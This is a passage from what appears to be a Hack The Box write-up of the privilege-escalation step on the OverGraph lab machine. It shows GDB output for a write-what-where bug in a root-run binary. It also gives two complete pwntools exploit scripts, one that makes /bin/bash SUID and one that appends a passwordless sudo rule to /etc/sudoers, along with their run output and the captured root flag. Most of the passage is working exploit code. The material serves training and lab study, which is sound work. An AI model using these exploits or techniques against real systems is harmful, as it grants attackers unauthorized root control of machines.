+<span class=code-dark-blue>0x00007ffff7a95f5f</span> in <span class=code-dark-yellow>_IO_vfscanf_internal</span> (<span class=code-dark-cyan>s</span>=&lt;optimized out&gt;, <span class=code-dark-cyan>format</span>=&lt;optimized out&gt;, <span class=code-dark-cyan>argptr=argptr@entry</span>=0x7fffffffe578, <span class=code-dark-cyan>errp=errp@entry</span>=0x0) at <span class=code-dark-green>vfscanf.c</span>:2  
+892
+2892    vfscanf.c: No such file or directory.
+</code></pre></div><p>We get a segmentation fault, because the program is trying to write <code>0x58</code> (<code>X</code>) into address <code>0x66647361</code> (<code>asdf</code> in hexadecimal format, little-endian):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤  </span>x/i $rip
+=&gt; <span class=code-dark-blue>0x7ffff7a95f5f</span> &lt;<span class=code-dark-yellow>_IO_vfscanf_internal</span>+12911&gt;: mov    BYTE PTR [r14],r8b  
+<span class=code-green>gef➤  </span>p $r14
+$1 = 0x66647361
+<span class=code-green>gef➤  </span>p $r8
+$2 = 0x58
+</code></pre></div><h2 id=privilege-escalation>Privilege escalation</h2><p>So we can potentially modify memory data. Here we have plenty of possibilities. One is to modify the command that is saved in <code>userinfo1 + 40</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk7>echo</span><span class=mtk1> </span><span class=mtk4>"Last Used On $(date)"</span><span class=mtk1> </span><span class=mtk5>&gt;&gt;</span><span class=mtk1> /var/log/kreport</span>  
+</code></pre></div><p>We can change it to be <code>chmod 4755 /bin/bash</code>, for example. Since the process is running as <code>root</code>, the command will be executed by <code>root</code>. To do so, our username must be the address of <code>userinfo1 + 40</code> (<code>0x404180 + 40 = 0x4041a8</code>). Next, we can use a simple <code>pwntools</code> script to perform the attack (<a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph/exploit_rce.py><code>exploit_rce.py</code></a>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env python3</span>
+
+<span class=mtk5>from</span><span class=mtk1> </span><span class="mtk8 mtku">pwn</span><span class=mtk1> </span><span class=mtk5>import</span><span class=mtk1> </span><span class=mtk1>context</span><span class=mtk1>, </span><span class=mtk1>log</span><span class=mtk1>, p64, </span><span class="mtk8 mtku">remote</span><span class=mtk1>, </span><span class="mtk8 mtku">sys</span>
+
+<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span><span class=mtk1> </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk4>'nreport_patched'</span>
+
+
+<span class="mtk7 mtki">def</span><span class=mtk1> </span><span class=mtk8>main</span><span class=mtk1>():</span>
+<span class=mtk1>    </span><span class=mtk1>token</span><span class=mtk1> </span><span class=mtk5>=</span><span class=mtk1> </span><span class="mtk7 mtki">b</span><span class=mtk4>'hD]AAAAAAVAAAT'</span>
+
+<span class=mtk1>    </span><span class=mtk5>if</span><span class=mtk1> </span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>) </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk6>3</span><span class=mtk1>:</span>
+<span class=mtk1>        </span><span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>error</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Usage: python3 </span><span class=mtk6>{</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]</span><span class=mtk6>}</span><span class=mtk4> &lt;ip&gt; &lt;port&gt;'</span><span class=mtk1>)</span>
+
+<span class=mtk1>    </span><span class=mtk1>host</span><span class=mtk1>, </span><span class=mtk1>port</span><span class=mtk1> </span><span class=mtk5>=</span><span class=mtk1> </span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>], </span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>]</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1> </span><span class=mtk5>=</span><span class=mtk1> </span><span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>host</span><span class=mtk1>, </span><span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>port</span><span class=mtk1>))</span>
+
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Enter Your Token: '</span><span class=mtk1>, </span><span class=mtk1>token</span><span class=mtk1>)</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Enter Name: '</span><span class=mtk1>, p64(</span><span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span><span class=mtk1>.sym.userinfo1 </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk6>40</span><span class=mtk1>))</span>  
+
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'&gt; '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>)</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Message Title: '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'AAAA'</span><span class=mtk1>)</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Message: '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'BBBB'</span><span class=mtk1>)</span>
+
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'&gt; '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'3'</span><span class=mtk1>)</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Enter number to edit: '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'12'</span><span class=mtk1>)</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Message Title: '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'chmod 4755 /bin/bash</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>)</span>
+
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'&gt; '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'5'</span><span class=mtk1>)</span>
+
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>
+
+
+<span class=mtk5>if</span><span class=mtk1> </span><span class=mtk1>__name__</span><span class=mtk1> </span><span class=mtk5>==</span><span class=mtk1> </span><span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+<span class=mtk1>    </span><span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><p>Notice that the binary runs with <code>socat</code> at <code>127.0.0.1:9851</code>, so we need to forward the port to access it from our attacker machine. The port forwarding can be done in SSH (<code>ENTER + ~C</code> to access the <code>ssh></code> prompt):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ ls -l /bin/bash  
+-rwxr-xr-x 1 root root 1183448 Apr 18 09:14 <span class=code-green>/bin/bash</span>
+<span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$
+ssh&gt; -L 9851:127.0.0.1:9851
+Forwarding port.
+
+<span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$
+</code></pre></div><p>Now we run the exploit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>exploit_rce.py</span> 127.0.0.1 9851
+[<span class=code-blue>*</span>] './nreport_patched'
+    Arch:     amd64-64-little
+    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
+    Stack:    <span class=code-dark-green>Canary found</span>
+    NX:       <span class=code-dark-green>NX enabled</span>
+    PIE:      <span class=code-dark-red>No PIE (0x3fd000)</span>
+    RUNPATH:  <span class=code-dark-red>b'./libc'</span>
+[<span class=code-green>+</span>] Opening connection to 127.0.0.1 on port 9851: Done  
+[<span class=code-blue>*</span>] Closed connection to 127.0.0.1 port 9851
+</code></pre></div><p>And we see that <code>/bin/bash</code> is now SUID, so we can run Bash as <code>root</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ ls -l /bin/bash  
+-rwsr-xr-x 1 root root 1183448 Apr 18 09:14 <span class="code-white code-bg-red">/bin/bash</span>
+<span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ bash -p
+bash-5.0# cat /root/root.txt
+413a25bd4e358c7863dd13455c053247
+</code></pre></div><p>Just for fun, another option is to modify the path <code>/opt/crv1/ + &lt;username></code> to be <code>/etc/passwd</code>, <code>/etc/sudoers</code> or <code>/root/.ssh/authorized_keys</code> and append the necessary data to escalate privileges using the <code>report</code> function:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span><span class=mtk1> </span><span class=mtk8>report</span><span class=mtk1>() {</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">long</span><span class=mtk1> in_FS_OFFSET;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">int</span><span class=mtk1> option;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">int</span><span class=mtk1> index;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">int</span><span class=mtk1> i;</span>
+<span class=mtk1>  FILE </span><span class=mtk5>*</span><span class=mtk1>fp;</span>
+<span class=mtk1>  </span><span class="mtk7 mtki">long</span><span class=mtk1> canary;</span>
+<span class=mtk1>  </span>
+<span class=mtk1>  canary </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (in_FS_OFFSET </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>);</span>
+<span class=mtk1>  fp </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk8>fopen</span><span class=mtk1>(userinfo1 </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>8c</span><span class=mtk1>, </span><span class=mtk4>"a"</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"1.Report Specific Message"</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"2.Report All Messages"</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"&gt; "</span><span class=mtk1>);</span>
+<span class=mtk1>  </span><span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>, </span><span class=mtk5>&amp;</span><span class=mtk1>option);</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (option </span><span class=mtk5>==</span><span class=mtk1> </span><span class=mtk6>1</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Index: "</span><span class=mtk1>);</span>
+<span class=mtk1>    </span><span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>, </span><span class=mtk5>&amp;</span><span class=mtk1>index);</span>
+
+<span class=mtk1>    </span><span class=mtk5>if</span><span class=mtk1> (Arryindex </span><span class=mtk5>&lt;</span><span class=mtk1> index) {</span>
+<span class=mtk1>      </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Invalid Index"</span><span class=mtk1>);</span>
+<span class=mtk1>    }</span>
+
+<span class=mtk1>    </span><span class=mtk8>fprintf</span><span class=mtk1>(fp,</span><span class=mtk4>"</span><span class=mtk6>%s</span><span class=mtk4> "</span><span class=mtk1>, </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (message_array </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) index </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>8</span><span class=mtk1>) </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>3c</span><span class=mtk1>);</span>  
+<span class=mtk1>    </span><span class=mtk8>fprintf</span><span class=mtk1>(fp,</span><span class=mtk4>"</span><span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>, </span><span class=mtk5>*</span><span class=mtk1>(undefined8 </span><span class=mtk5>*</span><span class=mtk1>) (message_array </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) index </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>8</span><span class=mtk1>));</span>
+<span class=mtk1>    </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"File stored At: </span><span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>, </span><span class=mtk5>0x</span><span class=mtk6>40420c</span><span class=mtk1>);</span>
+<span class=mtk1>  } </span><span class=mtk5>else</span><span class=mtk1> </span><span class=mtk5>if</span><span class=mtk1> (option </span><span class=mtk5>==</span><span class=mtk1> </span><span class=mtk6>2</span><span class=mtk1>) {</span>
+<span class=mtk1>    </span><span class=mtk5>for</span><span class=mtk1> (i </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk6>0</span><span class=mtk1>; i </span><span class=mtk5>&lt;</span><span class=mtk1> Arryindex; i </span><span class=mtk5>=</span><span class=mtk1> i </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk6>1</span><span class=mtk1>) {</span>
+<span class=mtk1>      </span><span class=mtk8>fprintf</span><span class=mtk1>(fp,</span><span class=mtk4>"</span><span class=mtk6>%s</span><span class=mtk4> "</span><span class=mtk1>, </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (message_array </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) i </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>8</span><span class=mtk1>) </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>3c</span><span class=mtk1>);</span>
+<span class=mtk1>      </span><span class=mtk8>fprintf</span><span class=mtk1>(fp,</span><span class=mtk4>"</span><span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>, </span><span class=mtk5>*</span><span class=mtk1>(undefined8 </span><span class=mtk5>*</span><span class=mtk1>) (message_array </span><span class=mtk5>+</span><span class=mtk1> (</span><span class="mtk7 mtki">long</span><span class=mtk1>) i </span><span class=mtk5>*</span><span class=mtk1> </span><span class=mtk6>8</span><span class=mtk1>));</span>
+<span class=mtk1>    }</span>
+
+<span class=mtk1>    </span><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"File stored At: </span><span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>, </span><span class=mtk5>0x</span><span class=mtk6>40420c</span><span class=mtk1>);</span>
+<span class=mtk1>  } </span><span class=mtk5>else</span><span class=mtk1> {</span>
+<span class=mtk1>    </span><span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Invalid Option"</span><span class=mtk1>);</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk8>fclose</span><span class=mtk1>(fp);</span>
+
+<span class=mtk1>  </span><span class=mtk5>if</span><span class=mtk1> (canary </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk1>) (in_FS_OFFSET </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>)) {</span>
+<span class=mtk3>                    /* WARNING: Subroutine does no</span><span class=mtk3>t return */</span>
+<span class=mtk1>    </span><span class=mtk8>__stack_chk_fail</span><span class=mtk1>();</span>
+<span class=mtk1>  }</span>
+
+<span class=mtk1>  </span><span class=mtk5>return</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>Basically, this function writes our messages into a file at <code>/opt/crv1/ + &lt;username></code> (as <code>root</code>).</p><p>Before I discovered the vulnerability in <code>edit</code>, I thought that I could enter some <code>../</code> in the username and trick the program to write to <code>/opt/crv1/../../etc/sudoers</code> (or any other file). But it does not work because <code>/opt/crv1</code> does not exist:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ ls -la /opt  
+total 16
+drwxr-xr-x  3 root root 4096 Apr 12 17:38 <span class=code-blue>.</span>
+drwxr-xr-x 18 root root 4096 Apr 12 17:38 <span class=code-blue>..</span>
+-rw-r--r--  1 root root  168 Apr  8 18:39 conv.sh
+drwxr-xr-x  3 root root 4096 Apr 12 17:38 <span class=code-blue>google</span>
+</code></pre></div><p>Using the write-what-where primitive, we can modify the path to be <code>/etc/sudoers</code> and then append <code>user ALL=NOPASSWD:ALL</code> (notice that the file is opened in <code>"a"</code> mode, which means &ldquo;append&rdquo;).</p><p>The address of the path is <code>userinfo1 + 140</code> (<code>0x404180 + 140 = 0x40420c</code>). Here there is a problem because <code>\x0c</code> is considered a new line character by <code>fgets</code> (actually, <code>\x0a</code>, <code>\x0b</code>, <code>\x0c</code> and <code>\x0d</code>), so it won&rsquo;t work. To avoid this, we can write at <code>0x40420e</code> using <code>pt/../etc/sudoers</code>, so that the overwritten path is <code>/opt/../etc/sudoers</code>.</p><p>The way that data is written is <code>&lt;message> &lt;message-title></code>, so we can take advantage of the whitespace and separate <code>user</code> and <code>ALL=PASSWORD:ALL</code> in our payload.</p><p>This will be the exploit code to write to <code>/etc/sudoers</code> (<a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph/exploit_write.py><code>exploit_write.py</code></a>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env python3</span>
+
+<span class=mtk5>from</span><span class=mtk1> </span><span class="mtk8 mtku">pwn</span><span class=mtk1> </span><span class=mtk5>import</span><span class=mtk1> </span><span class=mtk1>context</span><span class=mtk1>, </span><span class=mtk1>log</span><span class=mtk1>, p64, </span><span class="mtk8 mtku">remote</span><span class=mtk1>, </span><span class="mtk8 mtku">sys</span>
+
+<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span><span class=mtk1> </span><span class=mtk5>=</span><span class=mtk1> </span><span class=mtk4>'nreport_patched'</span>
+
+
+<span class="mtk7 mtki">def</span><span class=mtk1> </span><span class=mtk8>main</span><span class=mtk1>():</span>
+<span class=mtk1>    </span><span class=mtk1>token</span><span class=mtk1> </span><span class=mtk5>=</span><span class=mtk1> </span><span class="mtk7 mtki">b</span><span class=mtk4>'hD]AAAAAAVAAAT'</span>
+
+<span class=mtk1>    </span><span class=mtk5>if</span><span class=mtk1> </span><span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>) </span><span class=mtk5>!=</span><span class=mtk1> </span><span class=mtk6>3</span><span class=mtk1>:</span>
+<span class=mtk1>        </span><span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>error</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Usage: python3 </span><span class=mtk6>{</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]</span><span class=mtk6>}</span><span class=mtk4> &lt;ip&gt; &lt;port&gt;'</span><span class=mtk1>)</span>
+
+<span class=mtk1>    </span><span class=mtk1>host</span><span class=mtk1>, </span><span class=mtk1>port</span><span class=mtk1> </span><span class=mtk5>=</span><span class=mtk1> </span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>], </span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>]</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1> </span><span class=mtk5>=</span><span class=mtk1> </span><span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>host</span><span class=mtk1>, </span><span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>port</span><span class=mtk1>))</span>
+
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Enter Your Token: '</span><span class=mtk1>, </span><span class=mtk1>token</span><span class=mtk1>)</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Enter Name: '</span><span class=mtk1>, p64(</span><span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span><span class=mtk1>.sym.userinfo1 </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk6>140</span><span class=mtk1> </span><span class=mtk5>+</span><span class=mtk1> </span><span class=mtk6>2</span><span class=mtk1>))</span>  
+
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'&gt; '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'1'</span><span class=mtk1>)</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Message Title: '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'ALL=NOPASSWD:ALL'</span><span class=mtk1>)</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Message: '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'user'</span><span class=mtk1>)</span>
+
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'&gt; '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'3'</span><span class=mtk1>)</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Enter number to edit: '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'12'</span><span class=mtk1>)</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Message Title: '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'pt/../etc/sudoers'</span><span class=mtk1>)</span>
+
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'&gt; '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'4'</span><span class=mtk1>)</span>
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'&gt; '</span><span class=mtk1>, </span><span class="mtk7 mtki">b</span><span class=mtk4>'2'</span><span class=mtk1>)</span>
+
+<span class=mtk1>    </span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>
+
+
+<span class=mtk5>if</span><span class=mtk1> </span><span class=mtk1>__name__</span><span class=mtk1> </span><span class=mtk5>==</span><span class=mtk1> </span><span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+<span class=mtk1>    </span><span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ ls -l --time-style=+ /etc/sudoers  
+-r--r----- 1 root root 755  /etc/sudoers
+<span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ sudo -l
+[sudo] password for user:
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>exploit_write.py</span> 127.0.0.1 9851
+[<span class=code-blue>*</span>] './nreport_patched'
+    Arch:     amd64-64-little
+    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
+    Stack:    <span class=code-dark-green>Canary found</span>
+    NX:       <span class=code-dark-green>NX enabled</span>
+    PIE:      <span class=code-dark-red>No PIE (0x3fd000)</span>
+    RUNPATH:  <span class=code-dark-red>b'./libc'</span>
+[<span class=code-green>+</span>] Opening connection to 127.0.0.1 on port 9851: Done  
+[<span class=code-blue>*</span>] Closed connection to 127.0.0.1 port 9851
+</code></pre></div><p>And now we have <code>sudo</code> privileges without password:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ ls -l --time-style=+ /etc/sudoers
+-r--r----- 1 root root 777  /etc/sudoers
+<span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ sudo -l
+Matching Defaults entries for user on overgraph:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
+
+User user may run the following commands on overgraph:
+    (root) NOPASSWD: ALL
+<span class=code-green>user@overgraph</span>:<span class=code-blue>/usr/local/bin/Nreport</span>$ sudo su
+root@overgraph:/usr/local/bin/Nreport# cat /root/root.txt
+413a25bd4e358c7863dd13455c053247
